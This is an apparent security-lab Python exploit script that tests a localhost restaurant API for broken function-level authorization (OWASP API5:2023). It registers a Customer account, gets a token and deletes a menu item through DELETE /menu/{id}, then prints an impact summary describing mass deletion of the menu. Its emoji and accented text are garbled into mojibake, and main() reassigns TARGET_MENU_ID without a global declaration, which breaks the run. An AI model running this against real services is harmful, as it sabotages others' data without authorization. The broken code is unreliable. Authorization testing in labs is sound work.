import time
import requests

BASE_URL = "http://localhost:8091"

TEST_USER = {
    "username": "menu_attacker",
    "password": "attacker123",
    "phone_number": "300777888",
    "first_name": "Menu",
    "last_name": "Attacker"
}

TARGET_MENU_ID = 8 #Cambiar para otra prueba

def slow_print(msg, delay=0.8):
    print(msg)
    time.sleep(delay)

def separator(title=""):
    print("\n" + "="*70)
    if title:
        print(f"  {title}")
        print("="*70)
    print()

def register_user(user_data):
    slow_print(f"üìù Registrando: {user_data['username']}", 0.3)
    
    payload = {
        "username": user_data["username"],
        "password": user_data["password"],
        "phone_number": user_data["phone_number"],
        "first_name": user_data["first_name"],
        "last_name": user_data["last_name"]
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/register",
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        
        if r.status_code == 200 or r.status_code == 201:
            slow_print(f"‚úÖ Usuario creado (rol: Customer por defecto)\n", 0.3)
            return True
        else:
            slow_print(f"‚ö†Ô∏è  Error: {r.status_code}\n", 0.3)
            return False
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n", 0.3)
        return False

def get_token(username, password):
    slow_print(f"üîë Obteniendo token: {username}", 0.3)
    
    payload = {
        "username": username,
        "password": password
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/token",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        if r.status_code == 200:
            token_data = r.json()
            token = token_data.get("access_token")
            slow_print(f"‚úÖ Token obtenido\n", 0.3)
            return token
        else:
            slow_print(f"‚ùå Error: {r.status_code}\n", 0.3)
            return None
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n", 0.3)
        return None

def get_menu_items(token=None):
    slow_print(f"üìã Consultando men√∫ disponible...", 0.3)
    
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    try:
        r = requests.get(f"{BASE_URL}/menu", headers=headers)
        
        if r.status_code == 200:
            items = r.json()
            slow_print(f"‚úÖ Items disponibles: {len(items)}\n", 0.3)
            return items
        else:
            slow_print(f"‚ùå Error [{r.status_code}]: {r.text}\n", 0.3)
            return []
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n", 0.3)
        return []

def delete_menu_item(token, menu_id):
    slow_print(f"üóëÔ∏è  Intentando eliminar item de men√∫ ID={menu_id}...", 0.5)
    
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    try:
        r = requests.delete(
            f"{BASE_URL}/menu/{menu_id}",
            headers=headers
        )
        
        slow_print(f"\nüì° Respuesta [{r.status_code}]", 0.3)
        
        if r.status_code == 204:
            slow_print(f"‚úÖ Item eliminado exitosamente", 0.3)
            slow_print(f"   El servidor confirm√≥ la eliminaci√≥n\n", 0.3)
            return True
        elif r.status_code == 403:
            slow_print(f"üõ°Ô∏è  Acceso denegado (protegido)", 0.3)
            slow_print(f"   Detalle: {r.text}\n", 0.3)
            return False
        elif r.status_code == 404:
            slow_print(f"‚ö†Ô∏è  Item no encontrado", 0.3)
            slow_print(f"   El item ya no existe o ID inv√°lido\n", 0.3)
            return None
        else:
            slow_print(f"‚ö†Ô∏è  Respuesta inesperada: {r.text}\n", 0.3)
            return False
    except Exception as e:
        slow_print(f"‚ùå Error: {str(e)}\n", 0.3)
        return False

def main():
    separator("üö® EXPLOIT LEVEL 1 - BROKEN FUNCTION LEVEL AUTHORIZATION")
    
    slow_print("üìã Vulnerabilidad a explotar:")
    slow_print("   API5:2023 - Broken Function Level Authorization (BFLA)")
    slow_print("   ‚Üí Usuario Customer puede eliminar items del men√∫")
    slow_print("   ‚Üí Solo Employee/Chef deber√≠an tener este privilegio\n")
    
    separator("PASO 1: Crear usuario Customer")
    
    slow_print("üë§ Creando usuario con rol Customer (por defecto)...\n")
    
    if not register_user(TEST_USER):
        slow_print("‚ùå No se pudo crear usuario. Abortando...\n")
        return
    
    separator("PASO 2: Autenticaci√≥n")
    
    token = get_token(TEST_USER["username"], TEST_USER["password"])
    
    if not token:
        slow_print("‚ùå No se pudo obtener token. Abortando...\n")
        return
    
    slow_print(f"‚úÖ Usuario autenticado como: {TEST_USER['username']}")
    slow_print(f"   Rol esperado: Customer")
    slow_print(f"   Permisos esperados: Solo lectura de men√∫\n")
    
    separator("PASO 3: Consultar men√∫ inicial")
    
    initial_menu = get_menu_items(token)
    
    if initial_menu:
        slow_print(f"üìä MEN√ö INICIAL:")
        for idx, item in enumerate(initial_menu[:5], 1):
            slow_print(f"   {idx}. ID={item.get('id')} - {item.get('name')} (${item.get('price', 0)})", 0.2)
        
        if len(initial_menu) > 5:
            slow_print(f"   ... y {len(initial_menu) - 5} items m√°s", 0.2)
        slow_print("")
    
    target_item = None
    for item in initial_menu:
        if item.get('id') == TARGET_MENU_ID:
            target_item = item
            break
    
    if not target_item:
        slow_print(f"‚ö†Ô∏è  Item ID={TARGET_MENU_ID} no encontrado en el men√∫")
        slow_print(f"   Usando el primer item disponible para el test...\n")
        if initial_menu:
            target_item = initial_menu[0]
            TARGET_MENU_ID = target_item.get('id')
    
    if target_item:
        slow_print(f"üéØ ITEM OBJETIVO:")
        slow_print(f"   ID: {target_item.get('id')}")
        slow_print(f"   Nombre: {target_item.get('name')}")
        slow_print(f"   Precio: ${target_item.get('price', 0)}\n")
    
    separator("PASO 4: EXPLOTAR - Eliminar item del men√∫")
    
    slow_print("‚ö†Ô∏è  ATAQUE: Usuario Customer intenta funci√≥n administrativa")
    slow_print(f"   Endpoint: DELETE /menu/{TARGET_MENU_ID}")
    slow_print(f"   Acci√≥n: Eliminar item del men√∫")
    slow_print(f"   Autorizaci√≥n requerida: Employee/Chef")
    slow_print(f"   Autorizaci√≥n actual: Customer\n")
    
    deletion_successful = delete_menu_item(token, TARGET_MENU_ID)
    
    separator("PASO 5: Verificar resultado del ataque")
    
    slow_print("üîç Consultando men√∫ nuevamente para verificar...\n")
    
    final_menu = get_menu_items(token)
    
    item_still_exists = False
    for item in final_menu:
        if item.get('id') == TARGET_MENU_ID:
            item_still_exists = True
            break
    
    separator("üìä AN√ÅLISIS DE VULNERABILIDAD")
    
    print("\n" + "="*70)
    
    if deletion_successful and not item_still_exists:
        print("üö®üö®üö® VULNERABILIDAD CONFIRMADA üö®üö®üö®")
        print("="*70)
        slow_print("\n   ‚ùå FALLO DE AUTORIZACI√ìN CR√çTICO:")
        slow_print(f"   ‚ùå Usuario Customer elimin√≥ item ID={TARGET_MENU_ID} del men√∫")
        slow_print(f"   ‚ùå NO se valid√≥ el rol del usuario")
        slow_print(f"   ‚ùå Funci√≥n administrativa accesible sin privilegios\n")
        
        slow_print(f"   üìä EVIDENCIA:")
        slow_print(f"      ‚Ä¢ Items iniciales: {len(initial_menu)}")
        slow_print(f"      ‚Ä¢ Items finales: {len(final_menu)}")
        slow_print(f"      ‚Ä¢ Items eliminados: {len(initial_menu) - len(final_menu)}")
        slow_print(f"      ‚Ä¢ Status HTTP: 204 No Content (exitoso)\n")
        
        slow_print(f"   üí∏ IMPACTO:")
        slow_print(f"      ‚Ä¢ Cualquier customer puede sabotear el men√∫")
        slow_print(f"      ‚Ä¢ Eliminaci√≥n masiva de productos")
        slow_print(f"      ‚Ä¢ P√©rdida de ventas y disponibilidad")
        slow_print(f"      ‚Ä¢ Da√±o a operaciones del negocio\n")
        
        slow_print(f"   üîç VECTOR DE ATAQUE:")
        slow_print(f"      1. Crear cuenta como Customer")
        slow_print(f"      2. Obtener listado de IDs del men√∫")
        slow_print(f"      3. Eliminar items uno por uno (o en batch)")
        slow_print(f"      4. Dejar el men√∫ vac√≠o o saboteado\n")
        
    elif deletion_successful is False:
        print("‚úÖ API PROTEGIDA CORRECTAMENTE")
        print("="*70)
        slow_print(f"\n   ‚úÖ Se valid√≥ el rol del usuario correctamente")
        slow_print(f"   ‚úÖ Customer NO puede eliminar items del men√∫")
        slow_print(f"   ‚úÖ Solo Employee/Chef tienen acceso a esta funci√≥n\n")
        
    elif deletion_successful is None:
        print("‚ö†Ô∏è  RESULTADO INDETERMINADO")
        print("="*70)
        slow_print(f"\n   ‚ö†Ô∏è  Item no encontrado (puede estar ya eliminado)")
        slow_print(f"   ‚ÑπÔ∏è  Ejecute el script nuevamente con un ID v√°lido\n")
    
    separator("‚úÖ FIN DEL EXPLOIT LEVEL 1")
    
    slow_print(f"üí° Usuario atacante: {TEST_USER['username']} (Customer)")
    slow_print(f"üí° Item objetivo: ID={TARGET_MENU_ID}")
    slow_print(f"üí° Resultado: {'VULNERABLE' if deletion_successful else 'PROTEGIDO'}\n")

if __name__ == "__main__":
    main()